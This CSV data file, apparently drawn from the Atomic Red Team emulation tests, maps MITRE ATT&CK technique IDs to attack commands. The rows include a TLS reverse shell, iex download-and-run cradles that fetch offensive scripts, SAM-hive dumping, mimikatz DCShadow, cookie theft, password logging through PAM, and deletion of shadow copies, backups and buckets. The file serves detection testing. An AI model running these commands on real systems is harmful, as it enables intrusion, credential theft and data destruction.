mitre_id,command
T1531,sysadminctl -deleteuser #{user_account} #enter admin password # id_2263
T1033,set file=#{output_file_path}\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file% # id_6003
T1486,"set-content -path ""#{file_to_encrypt_location}"" -value ""populating this file with some text"" # create the test.txt file again in case prereqs failed cmd /c ""`""c:\program files (x86)\gnupg\bin\gpg.exe`"" --passphrase 'someparaphraseblah' --batch --yes -c `""#{file_to_encrypt_location}`"""" # id_4890"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1489,sudo killall -sigterm #{process_name}
T1220,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}"""
T1531,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} /delete # id_4442
T1578,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text   "
T1609,kubectl create -f #{path} -n #{namespace} # wait 3 seconds for the instance to come up sleep 3 kubectl exec -n #{namespace} busybox -- #{command}
T1072,"""%programfiles(x86)%/#{pdq_deploy_exe}"" "
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd /c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('#{execution_command}')) + ""{enter}"")"
T1201,cat /etc/login.defs 
T1531,"connect-azuread $userprincipalname = ""#{userprincipalname}"" remove-azureaduser -objectid $userprincipalname"
T1615,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gporemoteaccesspolicy -consoleoutput -noninteractive
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached # id_9551"
T1530,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}
T1072,# deploy 7-zip using chocolatey choco install -y 7zip # id_7144
T1056,"mavinject $pid /injectrunning ""#{file_name}"" invoke-webrequest #{server_name} -usebasicparsing # id_5964"
T1106,"C:\WINDOWS\MICROSOFT.NET\FRAMEWORK\V4.0.30319\CSC.EXE /OUT:""#{OUTPUT_FILE}"" /TARGET:EXE ""#{SOURCE_FILE}"" %TMP%/T1106.EXE"
T1546,"reg add ""hklm\software\microsoft\windows nt\currentversion\image file execution options\#{target_binary}"" /v debugger /d ""#{payload_binary}"" # id_8560"
T1619,"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done # id_9866"
T1543,"SC.EXE \\#{REMOTE_HOST} CREATE #{SERVICE_NAME} BINPATH= ""#{BINARY_PATH}"" START=#{STARTUP_TYPE} TYPE=#{SERVICE_TYPE} SC.EXE \\#{REMOTE_HOST} START #{SERVICE_NAME}"
T1489,net.exe stop #{service_name}
T1201,pwpolicy getaccountpolicies 
T1204,"$url = ""#{url}"" $outfile = ""#{outfile}"" invoke-webrequest -uri $url -outfile $outfile -usebasicparsing $process = start-process -filepath $outfile -passthru -windowstyle normal $process.id | out-file ""$env:temp\click-fix-pid.txt""  "
T1572,"for($i=0; $i -le #{query_volume}; $i++) { (invoke-webrequest ""#{doh_server}?name=#{subdomain}.$(get-random -minimum 1 -maximum 999999).#{domain}&type=#{query_type}"" -usebasicparsing).content }  "
T1056,"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/system-auth # id_4108"
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file #{output_file} -append write-output $($clsid)| out-file #{output_file} -append $handle=[activator]::createinstance([type]::gettypefromclsid($clsid)) $handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append $position += 1} catch{}} # id_1079"
T1486,which_ccencrypt=`which ccencrypt` cp #{root_input_file_path} #{cped_file_path}; $which_ccencrypt -t -k #{pwd_for_encrypted_file} #{cped_file_path}
T1053,"systemd-run --unit=atomic-red-team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'   "
T1016,ipconfig /all net config workstation net view /all /domain nltest /domain_trusts   
T1485,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name}  
T1201,SECEDIT.EXE /EXPORT /AREAS SECURITYPOLICY /CFG OUTPUT_MYSECPOL.TXT
T1047,"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall # id_8515"
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}"
T1490,wbadmin delete systemstatebackup -keepversions:0
T1547,"copy-item ""$pathtoatomicsfolder\t1547.001\src\jsestartup.jse"" ""$env:appdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" copy-item ""$pathtoatomicsfolder\t1547.001\src\jsestartup.jse"" ""c:\programdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" cscript.exe /e:jscript ""$env:appdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" cscript.exe /e:jscript ""c:\programdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"""
T1610,DOCKER BUILD -T T1610 $PATHTOATOMICSFOLDER/T1610/SRC/ DOCKER RUN --NAME T1610_CONTAINER --RM -ITD T1610 BASH /TMP/SCRIPT.SH
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive # id_8980
T1578,gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone} 
T1069,"net localgroup net localgroup ""administrators"""
T1489,sudo pkill -sigterm #{process_pattern}   
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1112,reg add hkey_current_user\software\microsoft\windows\currentversion\winlogon /t reg_dword /v allowmultipletssessions /d 1 /f
T1547,"copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"""
T1491,"$url = ""#{url_of_wallpaper}"" $imglocation = ""#{wallpaper_location}"" $orgwallpaper = (get-itemproperty -path registry::'hkey_current_user\control panel\desktop\' -name wallpaper).wallpaper $orgwallpaper | out-file -filepath ""#{pointer_to_orginal_wallpaper}"" $updatewallpapercode = @' using system.runtime.interopservices; namespace win32{ public class wallpaper{ [dllimport(""user32.dll"", charset=charset.auto)] static extern int systemparametersinfo (int uaction , int uparam , string lpvparam , int fuwinini) ; public static void setwallpaper(string thepath){ systemparametersinfo(20,0,thepath,3); } } } '@ $wc = new-object system.net.webclient try{ $wc.downloadfile($url, $imglocation) add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } catch [system.net.webexception]{ write-host(""cannot download $url"") add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } finally{ $wc.dispose() }"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1195,"KUBECTL RUN #{POD_NAME} --IMAGE=#{IMAGE_NAME} --RESTART=NEVER --ATTACH --RM -I -- BASH -LC ""MKDIR -P /TMP/TEST && CD /TMP/TEST && NPM INIT -Y >/DEV/NULL 2>&1 && ECHO '--- PACKAGE.JSON BEFORE INSTALL ---' && CAT PACKAGE.JSON && NPM INSTALL #{PACKAGE_NAME} --NO-AUDIT --NO-FUND --NO-PACKAGE-LOCK && ECHO '--- PACKAGE.JSON AFTER INSTALL ---' && CAT PACKAGE.JSON"""
T1539,"$devtoolsport = 9222 $testurl = ""https://www.google.com"" stop-process -name ""chrome"" -force -erroraction silentlycontinue $chromeprocess = start-process ""chrome.exe"" ""$testurl --remote-debugging-port=$devtoolsport --profile-directory=default"" -passthru start-sleep 10 $jsonresponse = invoke-webrequest ""http://localhost:$devtoolsport/json"" -usebasicparsing $devtoolspages = convertfrom-json $jsonresponse.content $ws_url = $devtoolspages[0].websocketdebuggerurl $ws = new-object system.net.websockets.clientwebsocket $uri = new-object system.uri($ws_url) $ws.connectasync($uri, [system.threading.cancellationtoken]::none).wait() $get_all_cookies_request = '{""id"": 1, ""method"": ""network.getallcookies""}' $buffer = [system.text.encoding]::utf8.getbytes($get_all_cookies_request) $segment = new-object system.arraysegment[byte] -argumentlist $buffer, 0, $buffer.length $ws.sendasync($segment, [system.net.websockets.websocketmessagetype]::text, $true, [system.threading.cancellationtoken]::none).wait() $completemessage = new-object system.text.stringbuilder do { $receivedbuffer = new-object byte[] 2048 $receivedsegment = new-object system.arraysegment[byte] -argumentlist $receivedbuffer, 0, $receivedbuffer.length $result = $ws.receiveasync($receivedsegment, [system.threading.cancellationtoken]::none).result $receivedstring = [system.text.encoding]::utf8.getstring($receivedsegment.array, $receivedsegment.offset, $result.count) $completemessage.append($receivedstring) } while (-not $result.endofmessage) $ws.closeasync([system.net.websockets.websocketclosestatus]::normalclosure, ""closing"", [system.threading.cancellationtoken]::none).wait() try { $response = convertfrom-json $completemessage.tostring() $cookies = $response.result.cookies } catch { write-host ""error parsing json data."" } write-host $cookies stop-process $chromeprocess -force # id_8688"
T1654,wevtutil enum-logs # id_4856
T1546,"reg add ""hklm\software\microsoft\windows nt\currentversion\image file execution options\#{target_binary}"" /v globalflag /t reg_dword /d 512 reg add ""hklm\software\microsoft\windows nt\currentversion\silentprocessexit\#{target_binary}"" /v reportingmode /t reg_dword /d 1 reg add ""hklm\software\microsoft\windows nt\currentversion\silentprocessexit\#{target_binary}"" /v monitorprocess /d ""#{payload_binary}"""
T1046,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') fruit -noninteractive -consoleoutput # id_2115
T1651,"IMPORT-MODULE ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1/AWSSSMATTACK.PS1"" -FORCE $ACCESS_KEY = ""#{ACCESS_KEY}"" $SECRET_KEY = ""#{SECRET_KEY}"" $SESSION_TOKEN = ""#{SESSION_TOKEN}"" $AWS_PROFILE = ""#{PROFILE}"" $REGION = ""#{REGION}"" SET-AWSAUTHENTICATION -ACCESSKEY $ACCESS_KEY -SECRETKEY $SECRET_KEY -SESSIONTOKEN $SESSION_TOKEN -AWSPROFILE $AWS_PROFILE -AWSREGION $REGION INVOKE-TERRAFORM -TERRAFORMCOMMAND INIT -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" INVOKE-TERRAFORM -TERRAFORMCOMMAND APPLY -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" -TERRAFORMVARIABLES @(""PROFILE=T1651-1"", ""REGION=$REGION"") INVOKE-SSMATTACK -AWSPROFILE ""T1651-1"" -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" INVOKE-TERRAFORM -TERRAFORMCOMMAND DESTROY -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" -TERRAFORMVARIABLES @(""PROFILE=T1651-1"", ""REGION=$REGION"")"
T1115,echo ifconfig | pbcopy $(pbpaste) # id_3065
T1003,reg save HKLM\SAM c:\users\public\backup.hiv
T1069,get-adprincipalgroupmembership #{user} | select name
T1136,"net user ""#{username}"" ""#{password}"" /add /domain"
T1202,"SCRIPTRUNNER.EXE -APPVSCRIPT ""#{PAYLOAD_PATH}"""
T1049,if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -np 2>/dev/null || true; fi
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh # id_1930
T1072,# deploy 7-zip using chocolatey choco install -y 7zip # id_2033
T1652,"find /lib/modules/$(uname -r)/kernel/drivers -name ""*.ko*"" # id_6737"
T1531,dscl . -delete /users/#{user_account} #enter admin password # id_6994
T1110,"@for /f %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\ipc$ /user:""%userdomain%\%n"" ""#{password}"" 1>nul 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\ipc$ > nul # id_6972"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached # id_5535"
T1072,"""%PROGRAMFILES(X86)%/#{RADMIN_EXE}"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_3833"
T1056,"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/system-auth"
T1652,lsmod
T1546,"reg add ""hklm\software\microsoft\terminal server client"" /v clxdllpath /t reg_sz /d ""#{dll_inf}"" /f   "
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard"""
T1218,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_uninstall_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil uninstall method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"" "
T1609,"docker build -t t1609 $pathtoatomicsfolder/t1609/src/ docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh docker exec -i t1609_container bash -c ""cat /tmp/output.txt"""
T1003,reg save HKLM\SAM backup
T1087,"get-adcomputer #{hostname} -properties ms-mcs-admpwd, ms-mcs-admpwdexpirationtime"
T1036,"sc create win32times binpath= ""cmd /c start c:\t1036.004_nonexistingscript.ps1"" sc qc win32times"
T1078,"cat /etc/passwd |grep nobody chsh --shell /bin/bash nobody usermod --password $(openssl passwd -1 nobody) nobody su -c ""whoami"" nobody  "
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh # id_7492
T1490,vssadmin.exe delete shadows /all /quiet 
T1014,"sudo modprobe #{rootkit_name} ping -c 10 localhost >/dev/null & targetpid=""$!"" ps $targetpid kill -31 $targetpid ps $targetpid || echo ""process ${targetpid} hidden"""
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/shells/invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress #{server_ip}
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f # id_9316"
T1609,kubectl create -f #{path} -n #{namespace} # wait 3 seconds for the instance to come up sleep 3 kubectl exec -n #{namespace} busybox -- #{command} # id_5546
T1071,"invoke-webrequest #{domain} -useragent ""httpbrowser/1.0"" | out-null invoke-webrequest #{domain} -useragent ""wget/1.9+cvs-stable (red hat modified)"" | out-null invoke-webrequest #{domain} -useragent ""opera/8.81 (windows nt 6.0; u; en)"" | out-null invoke-webrequest #{domain} -useragent ""*<|>*"" | out-null # id_7234"
T1003,reg save HKLM\SAM DUMP.TMP
